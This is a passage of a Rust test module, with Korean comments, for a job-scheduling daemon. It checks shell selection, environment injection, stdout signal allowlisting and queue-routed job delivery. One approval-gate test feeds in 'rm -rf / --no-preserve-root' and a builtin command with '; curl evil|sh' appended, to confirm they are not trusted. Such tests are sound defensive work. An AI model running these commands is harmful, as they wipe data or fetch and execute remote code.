        // 무음 소실 차단 — 헌장 복원 불변식). schedule_path()는 pack_dir 고정이라 핵심
        // 격리 동작인 quarantine_corrupt를 직접 검증한다.
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-corrupt-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("schedule.json");
        std::fs::File::create(&p)
            .unwrap()
            .write_all(b"{ this is not valid json ]")
            .unwrap();
        let backup = quarantine_corrupt(&p).expect("손상 파일은 격리(rename)돼야 한다");
        assert!(backup.exists(), "격리 백업 파일이 존재해야 한다(데이터 보존)");
        assert!(!p.exists(), "원본 손상 파일은 이동돼 자리에 남지 않아야 한다");
        assert!(
            backup.file_name().unwrap().to_string_lossy().contains(".corrupt-"),
            "백업 이름에 .corrupt- 표식이 있어야 한다"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn schedule_state_is_versioned_and_additive() {
        // schema_version 도입은 추가-전용 — 구파일(필드 부재)도 default 0으로 로드돼야 하고
        // (마이그레이션 호환), 신규 직렬화는 현재 버전을 실어야 한다.
        let old: ScheduleState =
            serde_json::from_str(r#"{"last_fired":{"j":5}}"#).expect("구파일도 로드돼야 함");
        assert_eq!(old.schema_version, 0, "구파일은 schema_version 0으로 로드(추가-전용)");
        assert_eq!(old.last_fired.get("j"), Some(&5));
        let mut s = ScheduleState::default();
        s.schema_version = SCHEDULE_STATE_VERSION;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("schema_version"), "직렬화는 schema_version을 실어야 한다");
        let back: ScheduleState = serde_json::from_str(&json).unwrap();
        assert_eq!(back.schema_version, SCHEDULE_STATE_VERSION);
    }

    #[test]
    fn command_shell_matches_platform() {
        // 회귀 가드: fire_command가 sh -c 하드코딩이면 Windows에서 항상 NotFound로
        // 실패한다. default_shell/create_surface와 동일하게 플랫폼별로 분기해야 한다.
        let (shell, flag) = command_shell();
        #[cfg(windows)]
        {
            // 동봉 bash 탐지 시 (절대경로,-c) · 미탐지 시에만 (cmd,/C) 폴백.
            if flag == "-c" {
                assert!(
                    shell.to_ascii_lowercase().ends_with("bash.exe"),
                    "-c 플래그는 bash 승격 경로에서만 나온다 — got: {shell}"
                );
            } else {
                assert_eq!(shell, "cmd");
                assert_eq!(flag, "/C");
            }
        }
        #[cfg(not(windows))]
        {
            assert_eq!(shell, "sh");
            assert_eq!(flag, "-c");
        }
    }

    /// ★핀(v0.13.22 백포트): Windows 셸 선택의 순수 코어 — 동봉 bash.exe 가 있으면 그 절대경로를
    /// 고르고(후보 순서 우선), 없으면 None(→ command_shell 이 cmd 폴백). 파일시스템만 보는 순수
    /// 함수라 어느 OS 에서도 결정론으로 검증된다(윈도우 실기 없이 결함 재발을 잡는 유일한 핀).
    #[test]
    fn resolve_bash_picks_bundled_and_falls_back_when_absent() {
        let root = std::env::temp_dir().join(format!(
            "cys-sched-bash-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        let miss = root.join("git").join("cmd"); // bash.exe 없는 후보
        let hit = root.join("git").join("bin"); // PortableGit 본진
        let hit2 = root.join("git").join("usr").join("bin");
        for d in [&miss, &hit, &hit2] {
            std::fs::create_dir_all(d).unwrap();
        }
        // 부재: 후보가 전부 비면 폴백(None)이어야 한다 — 없는 bash 를 강제 선택하면 전 잡이 spawn 실패.
        assert_eq!(
            resolve_bash_in(vec![miss.clone(), hit.clone()]),
            None,
            "bash.exe 부재 후보만 있으면 None(cmd 폴백)"
        );
        std::fs::write(hit.join("bash.exe"), b"stub").unwrap();
        std::fs::write(hit2.join("bash.exe"), b"stub").unwrap();
        assert_eq!(
            resolve_bash_in(vec![miss.clone(), hit.clone(), hit2.clone()]),
            Some(hit.join("bash.exe")),
            "실재하는 첫 후보를 절대경로로 선택(후보 순서 = 우선순위)"
        );
        // 빈 후보 목록(runtime 비동봉 설치)도 안전하게 None.
        assert_eq!(resolve_bash_in(Vec::new()), None);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// ★핀: 스케줄 발화 자식 env — 동봉 runtime PATH 선두 주입 + (Windows bash 비로그인 셸용)
    /// HOME 보정. 종전엔 둘 다 없어 데몬 PATH 로는 python3/printf 를 못 찾고 `${HOME}` 도 붕괴했다.
    #[test]
    fn spawn_env_injects_runtime_path_and_backfills_home() {
        let exe_dir = std::env::temp_dir().join(format!(
            "cys-sched-env-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        std::fs::create_dir_all(&exe_dir).unwrap();
        let pairs = cys::spawn_env_pairs(&exe_dir, "/usr/bin:/bin", Some("/Users/user"), None);
        let path = pairs
            .iter()
            .find(|(k, _)| k == "PATH")
            .map(|(_, v)| v.clone())
            .expect("PATH 주입 쌍이 있어야 한다(office-bridge·auto-restore 동일 SOT)");
        assert!(
            path.starts_with(&exe_dir.to_string_lossy().to_string()),
            "동봉 바이너리 폴더가 PATH 선두여야 한다 — got: {path}"
        );
        assert!(path.contains("/usr/bin"), "기존 PATH 는 보존돼야 한다 — got: {path}");
        assert!(
            !pairs.iter().any(|(k, _)| k == "HOME"),
            "HOME 이 이미 있으면 무접촉(unix 무변경 보장)"
        );
        // HOME 부재(Windows bash -c 비로그인 셸) → USERPROFILE 로 보정.
        let win = cys::spawn_env_pairs(&exe_dir, "/usr/bin", None, Some("C:\\Users\\x"));
        assert_eq!(
            win.iter().find(|(k, _)| k == "HOME").map(|(_, v)| v.as_str()),
            Some("C:\\Users\\x"),
            "HOME 미설정이면 ${{HOME}} 전개가 붕괴한다 — USERPROFILE 로 채워야 한다"
        );
        // 빈 문자열 USERPROFILE 은 보정 근거가 못 된다(빈 HOME 을 심으면 경로가 더 나빠진다).
        let neither = cys::spawn_env_pairs(&exe_dir, "/usr/bin", None, Some(""));
        assert!(!neither.iter().any(|(k, _)| k == "HOME"));
        let _ = std::fs::remove_dir_all(&exe_dir);
    }

    /// ★핀: command 잡이 exit≠0 로 끝나면 command_done **에 더해** schedule.error 가 발행돼야 한다.
    /// 종전엔 Ok 로 삼켜 schedule.fired 만 나갔다 — 잡이 매 주기 실패해도 이벤트상 '성공'
    /// 이라 무음 고장이었다(윈도우 잡 전멸을 이벤트로는 볼 수 없던 이유).
    #[tokio::test(flavor = "current_thread")]
    async fn failing_command_job_publishes_schedule_error() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "failing-cmd".into();
        j.action = "command".into();
        j.command = Some("exit 3".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let named = |n: &str| {
            events
                .iter()
                .find(|e| e["name"].as_str() == Some(n))
                .cloned()
        };
        let done = named("schedule.command_done").expect("command_done 은 종전대로 발행(무회귀)");
        assert_eq!(done["payload"]["exit"].as_i64(), Some(3));
        let err = named("schedule.error").expect("exit≠0 은 schedule.error 로 표면화돼야 한다");
        assert_eq!(err["payload"]["job_id"].as_str(), Some("failing-cmd"));
        let msg = err["payload"]["error"].as_str().unwrap_or("");
        assert!(msg.contains('3'), "에러에 exit code 가 실려야 한다 — got: {msg}");
        assert!(
            named("schedule.fired").is_none(),
            "실패 발화가 fired 로도 보고되면 모니터링이 모순된다"
        );
    }

    /// ★R2 codex medium 핀: 폴백 경고 재발행 판정 — bash 승격(-c)이면 절대 발행하지 않고,
    /// cmd 폴백(/C)은 미발행 또는 1시간 경과 시에만 재발행(스팸 없이 무음도 없는 유계 재발행).
    #[test]
    fn fallback_warning_is_throttled_not_once() {
        // bash 승격 경로 — 어떤 시각에도 경고 없음
        assert!(!should_warn_fallback("-c", 0, 10_000));
        assert!(!should_warn_fallback("-c", 5_000, 10_000));
        // cmd 폴백 — 최초(미발행)는 발행
        assert!(should_warn_fallback("/C", 0, 10_000));
        // 직전 발행 후 1시간 미만 — 억제 (스팸 차단)
        assert!(!should_warn_fallback("/C", 10_000, 10_000 + 3_599));
        // 1시간 경과 — 재발행 (종전 AtomicBool 1회 방식은 여기서 영구 무음으로 회귀했다)
        assert!(should_warn_fallback("/C", 10_000, 10_000 + 3_600));
    }

    /// ★T-0147-2 §1-B N6b 핀(순수부): stdout 토큰 파싱 — 정상·중복·미지 거부·상한·문법.
    #[test]
    fn gate_signals_from_stdout_allowlists_and_dedupes() {
        // 정상 1건 — 요약 줄 안에 섞여 있어도 토큰만 뽑는다.
        assert_eq!(
            gate_signals_from_stdout("gate ok nodes=4 gate_signal=state_unwritable lane=base"),
            vec!["state_unwritable".to_string()]
        );
        // 여러 줄·중복 → 1건
        assert_eq!(
            gate_signals_from_stdout(
                "gate_signal=state_unwritable\n다른 줄\ngate_signal=state_unwritable\n"
            ),
            vec!["state_unwritable".to_string()]
        );
        // 미지 토큰 거부(deny-by-default) — stdout 은 신뢰 경계 밖이다.
        assert!(gate_signals_from_stdout("gate_signal=rm_rf_root").is_empty());
        assert!(gate_signals_from_stdout("gate_signal=state_unwritable_extra").is_empty());
        assert!(gate_signals_from_stdout("gate_signal=STATE_UNWRITABLE").is_empty(), "소문자만");
        assert!(gate_signals_from_stdout("gate_signal=").is_empty(), "빈 name 거부");
        assert!(gate_signals_from_stdout("gate_signal= state_unwritable").is_empty());
        // 길이 초과(>40)는 절단이 아니라 거부
        assert!(gate_signals_from_stdout(&format!("gate_signal={}", "a".repeat(41))).is_empty());
        // 토큰 없는 평범한 stdout
        assert!(gate_signals_from_stdout("게이트 정상 종료\n").is_empty());
        // 상한 4 — 현재 allowlist 가 1종이라 dedupe 로 이미 1건이지만, 상한 상수가 살아있음을
        // 계약으로 남긴다(allowlist 확장 시 여기가 폭주 방지선).
        let flood = "gate_signal=state_unwritable ".repeat(50);
        assert!(gate_signals_from_stdout(&flood).len() <= 4);
    }

    /// ★T-0147-2 §1-B N6b 핀(배선): stdout 토큰을 내는 command 잡 → `gate.state_unwritable`
    /// 이벤트 발행. 데몬이 state 를 못 쓰는 게이트의 유일한 목격자가 된다.
    #[tokio::test(flavor = "current_thread")]
    async fn command_job_stdout_token_publishes_gate_signal_event() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "gate-signal-cmd".into();
        j.action = "command".into();
        // echo 는 sh/cmd 양쪽에서 동일하게 동작한다(플랫폼 무관 핀).
        j.command = Some("echo gate_signal=state_unwritable".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let sig = events
            .iter()
            .find(|e| e["name"].as_str() == Some("gate.state_unwritable"))
            .expect("stdout 토큰은 gate.* 이벤트로 승격돼야 한다");
        assert_eq!(sig["payload"]["job_id"].as_str(), Some("gate-signal-cmd"));
        assert_eq!(sig["payload"]["signal"].as_str(), Some("state_unwritable"));
        // 무회귀: 기존 command_done·fired 는 그대로.
        let has = |n: &str| events.iter().any(|e| e["name"].as_str() == Some(n));
        assert!(has("schedule.command_done") && has("schedule.fired"));
        // CC 배지 축에도 흡수됐는지(state 외부 oracle 의 사람이 보는 표면).
        let badges = crate::alerts::gate_signal_badges(now_epoch());
        assert!(
            badges.iter().any(|b| b.key == "signal/gate.state_unwritable"
                && b.severity == "critical"),
            "게이트 신호는 critical 배지로 노출돼야 한다"
        );
    }

    /// 대칭 핀: 토큰 없는 평범한 command 잡은 gate.* 를 만들지 않는다(오염 0).
    #[tokio::test(flavor = "current_thread")]
    async fn command_job_without_token_publishes_no_gate_signal() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "plain-cmd".into();
        j.action = "command".into();
        j.command = Some("echo hello".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        assert!(
            !events
                .iter()
                .any(|e| e["name"].as_str().is_some_and(|n| n.starts_with("gate."))),
            "토큰 없는 stdout 이 gate.* 를 만들면 이벤트 공간이 오염된다"
        );
    }

    #[tokio::test(flavor = "current_thread")]
    async fn successful_command_job_still_reports_fired() {
        // 대칭 확인(성공 경로 무변경): exit 0 은 command_done + fired, error 없음.
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "ok-cmd".into();
        j.action = "command".into();
        j.command = Some("exit 0".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let has = |n: &str| events.iter().any(|e| e["name"].as_str() == Some(n));
        assert!(has("schedule.command_done") && has("schedule.fired"));
        assert!(!has("schedule.error"), "성공 경로에 error 가 새로 생기면 회귀다");
    }

    #[test]
    fn command_shell_actually_spawns_on_this_platform() {
        // 선택된 셸이 실제로 현재 플랫폼에서 spawn되는지 확인 — 잘못된 셸명이면
        // ErrorKind::NotFound로 실패한다. (Windows CI에서 cmd, 그 외에서 sh 검증)
        let (shell, flag) = command_shell();
        let out = std::process::Command::new(shell)
            .arg(flag)
            .arg("echo cys")
            .output()
            .expect("command_shell() must select a shell present on this platform");
        assert!(out.status.success());
        assert!(String::from_utf8_lossy(&out.stdout).contains("cys"));
    }

    // R-CLI-4: 코드 소유 built-in text_command만 무승인 신뢰, 임의·변조 명령은 승인 게이트 대상.
    #[test]
    fn builtin_text_commands_are_trusted_others_gated() {
        for j in builtin_jobs() {
            if let Some(cmd) = j.get("text_command").and_then(|v| v.as_str()) {
                assert!(
                    is_trusted_builtin_text_command(cmd),
                    "built-in text_command이 신뢰되지 않음: {cmd}"
                );
            }
        }
        // 임의 명령은 built-in 아님 → 승인 게이트 대상.
        assert!(
            !is_trusted_builtin_text_command("rm -rf / --no-preserve-root"),
            "임의 명령이 built-in으로 신뢰됨"
        );
        // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
        assert!(
            !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
            "변조된 built-in이 신뢰됨"
        );
    }

    // ═══════ ★(0.14.31 · WP-3 B) CSO alert inbox 60분 점검 잡 · via_queue 계약 ═══════

    /// ★신규 builtin 잡의 계약 핀. **버전 범프 없이** append 되고, 이 잡만 `via_queue` 다.
    ///
    /// 왜 `via_queue` 인가: 스케줄 push 는 `fire_push`→`inject` 로 큐를 **우회**한다(§8 명시).
    /// CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 전부
    /// 건너뛰고 좌석에 글자를 꽂는다 — 그것이 부트체인 치명위험 ①(폭주)의 정확한 형상이다.
    #[test]
    fn alert_inbox_job_is_queue_routed_and_added_without_version_bump() {
        let mut jobs: Vec<serde_json::Value> = Vec::new();
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed && conflicts.is_empty());
        let j = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m"))
            .expect("WP-3 B 60분 점검 잡 부재")
            .clone();
        assert_eq!(j["every_minutes"].as_u64(), Some(60), "정본 '정기 60분 점검'");
        // ★(리뷰 R1 · codex blocking) **강등 안전**: 이 잡의 action 은 구 데몬이 **모르는** 이름이다.
        //   `action:"push"` + `via_queue` 로만 표현하면 구 데몬(롤백)이 미지 필드를 무시하고
        //   직접 주입한다 — 초안·승인 화면에 글자와 Return 이 꽂힌다.
        assert_eq!(j["action"].as_str(), Some(ACTION_PUSH_QUEUED), "큐 경유가 계약인 push 레인");
        assert!(
            !LEGACY_ACTIONS.contains(&j["action"].as_str().unwrap()),
            "구 데몬이 아는 action 이면 강등 시 게이트 없이 주입된다"
        );
        assert_eq!(j["to"].as_str(), Some("cso"));
        assert_eq!(j["if_absent"].as_str(), Some("skip"), "좌석 부재는 에러가 아니다");
        assert_eq!(j["via_queue"].as_bool(), Some(true), "이 잡만 큐 경유(게이트 통과)");
        assert_eq!(j["base_only"].as_bool(), None, "부서 데몬도 자기 CSO 를 점검한다(base 전용 아님)");
        // ★범프 금지 — 신규 id 는 버전 무관 append 다(범프는 기존 builtin 을 코드 정의로 통째
        //   교체해 운영자 수기 편집을 무언 소실시킨다).
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "신규 잡 추가로 버전을 올리지 않았다");
        assert_eq!(j["_builtin_version"].as_u64(), Some(BUILTIN_JOBS_VERSION));
        // 재실행 무접촉(중복 0) — add-if-missing 멱등.
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "동버전 재실행은 무접촉");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m")).count(),
            1,
            "재실행에도 중복 생성 0"
        );
        // ★다른 builtin 잡은 **하나도** via_queue 가 아니다(기존 잡 무회귀 — 직접 주입 의미 보존).
        for other in jobs.iter().filter(|x| x["id"].as_str() != Some("cso-alert-inbox-check-60m")) {
            assert!(
                other.get("via_queue").is_none(),
                "{} 에 via_queue 가 붙었다(기존 잡 의미 변경)",
                other["id"]
            );
        }
        // 문안 계약: 선두 라벨을 스스로 달지 않는다(ensure_machine_label 이 `[schedule <id>]` 를
        // 붙인다) · CSO 를 다시 구독(Monitor)·크론으로 돌려보내지 않는다.
        let text = j["text"].as_str().expect("점검 문안 부재");
        assert!(!text.starts_with('['), "선두 라벨은 데몬이 단다(중복 라벨 금지): {text}");
        assert_eq!(
            ensure_machine_label(text, "cso-alert-inbox-check-60m"),
            format!("[schedule cso-alert-inbox-check-60m] {text}")
        );
        assert!(text.contains("Monitor"), "직접 구독 금지 문구가 있어야 한다");
        assert!(text.contains("무이상 무기록"), "무이상 무기록 규약 문구가 있어야 한다");
    }

    /// ★`Job::via_queue` 는 **추가-전용** 필드다: 구 schedule.json(필드 부재)은 false 로 읽히고,
    /// 그 잡들은 종전대로 직접 주입 경로를 탄다(무회귀).
    #[test]
    fn via_queue_defaults_false_for_legacy_schedule_files() {
        let legacy: Job = serde_json::from_value(json!({
            "id": "legacy", "action": "push", "to": "master", "text": "x"
        }))
        .expect("구 파일 파싱");
        assert!(!legacy.via_queue, "부재 = false(기존 잡 전원 무회귀)");
        let opted: Job = serde_json::from_value(json!({
            "id": "new", "action": "push", "to": "cso", "text": "x", "via_queue": true
        }))
        .expect("신 파일 파싱");
        assert!(opted.via_queue);
    }

    /// ★배달 선택은 대상 좌석이 확정된 **뒤** 한 지점에서만 갈린다 — `fresh` 경로와 일반 경로가
    /// **같은 함수**를 부르지 않으면 `fresh: true` 하나로 게이트를 통째 우회할 수 있다.
    /// (소스 핀 — 행동 검체는 아래 `deliver_push_branches_are_observable` 가 진다.)
    #[test]
    fn source_pin_both_push_paths_share_one_delivery_choice() {
        let src = include_str!("schedule.rs");
        let at = src.find("async fn fire_push(").expect("fire_push 소실");
        // fire_push 본문만 자른다 — 바로 뒤의 `deliver_push`(그 안에 직접 주입이 **있어야** 한다)를
        // 포함하면 아래 음성 단언이 자기 자신을 잡는다.
        let end = src[at..]
            .find("fn deliver_push(")
            .map(|e| at + e)
            .expect("deliver_push 소실");
        let body = &src[at..end];
        assert_eq!(
            body.matches("deliver_push(daemon, job, sid, text,").count(),
            2,
            "fresh 경로와 일반 경로 **양쪽**이 같은 배달 선택을 타야 한다"
        );
        assert!(
            !body.contains("inject(daemon, sid, text)?;"),
            "fire_push 안에 직접 주입이 남아 있다(via_queue 가 우회된다)"
        );
        // ★fresh 의 TTL 회수 배선(리뷰 R2 · claude minor로 **재핀**).
        //
        // R1 은 "회수 등록이 배달 **앞**" 을 핀으로 박았다. 그 순서 자체가 결함이었다:
        // `effective_close_ttl` 은 `close_after_secs: 0` 을 그대로 Some(0) 으로 돌리므로
        // 멀티스레드 런타임에서 회수 태스크가 **배달보다 먼저** 좌석을 닫을 수 있었다
        // (`deliver_push` 가 SeatGone·"surface gone" 으로 실패 — 종전 순서에는 없던 경로).
        //
        // 지켜야 할 불변은 순서가 아니라 **무조건성**이다: 성공·실패 어느 반환 경로에서도
        // 회수가 걸려야 갓 띄운 좌석이 누수되지 않는다. 그래서 배달 결과를 손에 쥔 채
        // (`let delivered = deliver_push(...);`) 등록하고 그 뒤에 `?` 로 전파한다.
        let ttl_at = body.find("effective_close_ttl(job)").expect("fresh TTL 회수 배선이 사라졌다");
        let deliver_at = body.find("deliver_push(daemon, job, sid, text,").expect("배달 호출 소실");
        assert!(
            deliver_at < ttl_at,
            "TTL 회수 등록이 배달 시도보다 앞이다 — close_after_secs:0 에서 회수가 배달을 앞지른다"
        );
        assert!(
            body.contains("let delivered = deliver_push(daemon, job, sid, text, None);")
                && body.contains("let how = delivered?;"),
            "배달 결과를 보류한 채 회수를 등록하는 구조가 아니다 — 실패 경로에서 좌석이 누수된다"
        );
    }

    /// ★행동 검체(리뷰 R1 · codex major): `deliver_push` 의 **두 분기를 실제로 실행**해
    /// 큐 적재와 직접 주입을 관측한다. 소스 문자열 검체만으로는 `deliver_push` 를 항상 주입으로
    /// 바꿔도 호출 문자열이 그대로라 초록이었다.
    #[test]
    fn deliver_push_branches_are_observable() {
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, Some("cso".into()), 24, 80)
            .expect("좌석 생성");
        daemon.roles.lock().unwrap().insert("cso".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        // ★(리뷰 R2) 목적지 적격성은 **에이전트 등록**을 요구한다(빈 셸은 대상이 아니다).
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        let depth = || s.pending_queue.lock().unwrap().len();

        // ① 직접 주입 분기 — 큐에는 아무것도 남지 않는다(§8 "스케줄 push 는 큐를 우회한다").
        let direct: Job = serde_json::from_value(json!({
            "id": "direct", "action": "push", "to": "cso", "text": "x"
        }))
        .unwrap();
        assert!(!direct.uses_queue());
        assert_eq!(deliver_push(&daemon, &direct, s.id, "[schedule direct] 본문", None), Ok("pushed"));
        assert_eq!(depth(), 0, "직접 주입이 큐에 적재됐다(경로가 뒤바뀌었다)");

        // ② 큐 경유 분기 — 좌석 활성 큐에 남고 **주입은 배달자(게이트 통과 후)가 한다**.
        let queued: Job = serde_json::from_value(json!({
            "id": "cso-alert-inbox-check-60m", "action": ACTION_PUSH_QUEUED, "to": "cso", "text": "x"
        }))
        .unwrap();
        assert!(queued.uses_queue(), "action 만으로도 큐 경유여야 한다(via_queue 필드 없이)");
        assert_eq!(
            deliver_push(&daemon, &queued, s.id, "[schedule cso-alert-inbox-check-60m] 점검", None),
            Ok("queued")
        );
        assert_eq!(depth(), 1, "큐 경유가 적재하지 않았다");
        let e = s.pending_queue.lock().unwrap()[0].clone();
        assert_eq!(e.origin, "schedule", "큐 항목의 경로 태그가 schedule 이 아니다");
        // ★발신 라벨은 **그 잡**이다(종전 "daemon" → 원장에서 스케줄 발화가 데몬 경보로 찍혔다).
        assert_eq!(e.from.as_deref(), Some("schedule:cso-alert-inbox-check-60m"));
        // surface ref 형식이 아니므로 원장에서는 from_label 로 간다(§8 from 계약 준수).
        let (from, label) = crate::delivery::split_queue_from(e.from.as_deref());
        assert_eq!(from, None, "임의 문자열이 원장 from(surface ref)에 들어갔다");
        assert_eq!(label.as_deref(), Some("schedule:cso-alert-inbox-check-60m"));

        // ③' 직접 주입 분기도 **같은 역할 가드**를 받는다(리뷰 R2 · claude minor).
        //     종전에는 큐 경유에만 가드가 있어 기존 builtin push 전원(하트비트 등)이 인계 경쟁을
        //     그대로 졌다 — 인계가 끝난 뒤의 주입은 버려진 셸에 타이핑된다.
        {
            let mut roles = daemon.roles.lock().unwrap();
            roles.insert("cso".into(), s.id + 4_242); // 인계 완료(다른 좌석이 역할을 가져갔다)
        }
        let direct_err = deliver_push(
            &daemon,
            &direct,
            s.id,
            "[schedule direct] 인계 뒤 본문",
            Some(crate::alert_route::RoleGuard::Exact("cso")),
        )
        .expect_err("인계된 뒤에도 구 좌석에 직접 주입했다");
        assert!(direct_err.contains("handed over"), "실패 사유가 인계 경쟁이 아니다: {direct_err}");
        assert_eq!(depth(), 1, "직접 주입 거절이 큐를 건드렸다");
        // 가드가 없으면(좌석을 지목받은 fresh·if_absent:launch 경로) 종전대로 주입된다.
        assert_eq!(
            deliver_push(&daemon, &direct, s.id, "[schedule direct] 지목 본문", None),
            Ok("pushed"),
            "좌석을 지목받은 경로까지 가드가 막았다(무회귀 위반)"
        );
        daemon.roles.lock().unwrap().insert("cso".into(), s.id); // 원복

        // ③ 역할 가드 — 대상을 역할로 골랐다면 인계 뒤 적재는 거절된다.
        daemon.roles.lock().unwrap().insert("cso".into(), s.id + 9_999);
        let err = deliver_push(
            &daemon,
            &queued,
            s.id,
            "[schedule x] y",
            Some(crate::alert_route::RoleGuard::Exact("cso")),
        )
        .expect_err("인계된 뒤에도 버려진 셸에 적재됐다");
        assert!(err.contains("role_changed"), "실패 사유가 인계 경쟁이 아니다: {err}");
        assert_eq!(depth(), 1, "거절인데 항목이 늘었다");
        let _ = crate::governance::close_surface(&daemon, s.id, crate::governance::CloseCause::Reap);
    }

    /// ★강등 실행 검체(리뷰 R1 · codex blocking): 구 데몬의 `fire()` 는 action 을
    /// `push`·`command` 로만 분기하고 나머지는 `unknown action` 에러다. 이 잡의 action 이
    /// 그 집합에 들어가는 순간 **롤백한 데몬이 게이트 없이 주입한다**.
    #[test]
    fn a_downgraded_daemon_rejects_the_queue_job_instead_of_injecting() {
        // 구 데몬의 분기를 그대로 재현한 순수 함수(그쪽 코드는 여기서 실행할 수 없다).
        fn legacy_dispatch(action: &str) -> Result<&'static str, String> {
            match action {
                "push" => Ok("fire_push"),
                "command" => Ok("fire_command"),
                other => Err(format!("unknown action '{other}'")),
            }
        }
        let mut jobs: Vec<serde_json::Value> = Vec::new();
        apply_builtin_jobs(&mut jobs);
        let j = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m"))
            .expect("점검 잡 부재");
        let action = j["action"].as_str().unwrap();
        assert!(
            legacy_dispatch(action).is_err(),
            "구 데몬이 이 잡을 실행한다 — 강등이 곧 게이트 우회다"
        );
        // 신 데몬은 두 표현 모두 큐 경유로 읽는다.
        for a in [ACTION_PUSH_QUEUED, "push"] {
            let job: Job = serde_json::from_value(json!({
                "id": "x", "action": a, "to": "cso", "text": "t",
                "via_queue": a == "push"
            }))
            .unwrap();
            assert!(job.uses_queue(), "{a} 가 큐 경유로 읽히지 않았다");
        }
        // 다른 builtin(직접 주입이 계약인 잡)은 여전히 구 데몬이 아는 action 이다 — 무회귀.
        for other in jobs.iter().filter(|x| x["id"].as_str() != Some("cso-alert-inbox-check-60m")) {
            let a = other["action"].as_str().unwrap();
            assert!(LEGACY_ACTIONS.contains(&a), "{} 의 action 이 바뀌었다: {a}", other["id"]);
        }
    }

    /// ★표적 마이그레이션(리뷰 R1 · codex blocking): 구 빌드가 심어 둔 **동버전** 잡은
    /// `apply_builtin_jobs` 가 무접촉으로 지나간다 — 그러면 저장된 `action:"push"` 가 남아
    /// 큐 우회 주입이 계속된다. 전역 버전 범프는 §B-5 금지(다른 builtin 의 운영자 편집 소실)이므로
    /// **같은 id·같은 마커 항목의 그 필드만** 고친다.
    #[test]
    fn stored_legacy_push_action_is_migrated_in_place_without_a_version_bump() {
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 120,                       // 운영자가 손으로 고친 주기
            "action": "push",                            // 구 빌드가 심은 값
            "to": "cso",
            "if_absent": "skip",
            "via_queue": true,
            "text": "운영자가 고친 문안",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        })];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed, "저장된 구 action 이 그대로 남았다(강등 시 게이트 우회)");
        assert!(conflicts.is_empty());
        let j = &jobs[0];
        assert_eq!(j["action"].as_str(), Some(ACTION_PUSH_QUEUED));
        assert_eq!(j["via_queue"].as_bool(), Some(true));
        // ★운영자 편집은 **그대로** 남는다(통째 교체가 아니라 그 필드만 고쳤다는 증거).
        assert_eq!(j["every_minutes"].as_u64(), Some(120), "운영자 주기 편집이 소실됐다");
        assert_eq!(j["text"].as_str(), Some("운영자가 고친 문안"), "운영자 문안이 소실됐다");
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "표적 이관에 전역 버전을 올렸다(§B-5 위반)");
        // 재실행 무접촉(멱등).
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "이관 뒤 재실행이 또 바꾼다(비멱등)");
        // 사용자가 그 id 를 선점한 경우(마커 불일치)는 손대지 않는다 — 종전 계약 불변.
        let mut theirs: Vec<serde_json::Value> = vec![json!({
            "id": "cso-alert-inbox-check-60m", "action": "push", "to": "master"
        })];
        let (c3, conf3, _) = apply_builtin_jobs(&mut theirs);
        assert!(!c3 || theirs[0]["action"].as_str() == Some("push"));
        assert_eq!(theirs[0]["action"].as_str(), Some("push"), "사용자 잡의 action 을 바꿨다");
        assert!(conf3.contains(&"cso-alert-inbox-check-60m".to_string()), "선점 conflict 미보고");
    }
}

// ═════════════════ 독립 판정(triage R3-WP3B) — 잔여 지적 재현 검체 ═════════════════
// 현재 HEAD 에서 **실패하도록** 쓰였다. 통과하면 그 지적은 반증이다.
#[cfg(test)]
mod triage_schedule {
    use super::*;
    use serde_json::json;
    use std::sync::atomic::Ordering;
    use super::tests::test_daemon;

    /// [codex #8 blocking] 강등 안전이 builtin 만 덮고, **지원한다고 문서화한 opt-in 표현**은 덮지 않는다.
    ///
    /// `Job::uses_queue`(schedule.rs:113)는 `action:"push" + via_queue:true` 도 큐 경유로 인정한다.
    /// 그 표현으로 저장된 잡을 구 데몬(=`via_queue` 미지 필드 무시)이 읽으면 `"push"` 로 보고
    /// `fire_push` → 직접 `inject` 를 한다 — 큐가 지키던 초안·승인대기·alt-screen 게이트가
    /// 통째로 사라진다.
    #[test]
    fn triage_x8_queue_required_job_is_stored_in_a_downgrade_rejected_action() {
        let job: Job = serde_json::from_value(json!({
